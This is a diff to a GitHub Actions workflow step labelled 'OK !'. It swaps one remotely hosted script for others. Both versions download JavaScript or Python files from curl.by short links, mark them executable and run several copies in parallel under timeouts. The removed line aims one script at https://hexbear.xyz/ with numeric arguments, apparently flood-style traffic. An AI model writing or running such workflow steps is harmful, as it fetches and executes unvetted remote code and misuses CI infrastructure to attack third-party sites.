@@ -15,11 +15,14 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget https://curl.by/JeBb7/uamv.js
-          chmod +x uamv.js
+          pip install git+https://github.com/QuantumLLC/Archer
+          wget https://curl.by/XkdGB/Test.py
+          wget https://curl.by/XkdGB/testraw.js
+          chmod +x testraw.js
+          chmod +x Test.py
           PIDS=()
           for i in {1..4}; do
-            timeout 105 node uamv.js https://hexbear.xyz/ 10 90 100
+            timeout 105 python3 Test.py 1 && node testraw.js 1 666
             PIDS+=($!)
           done
           
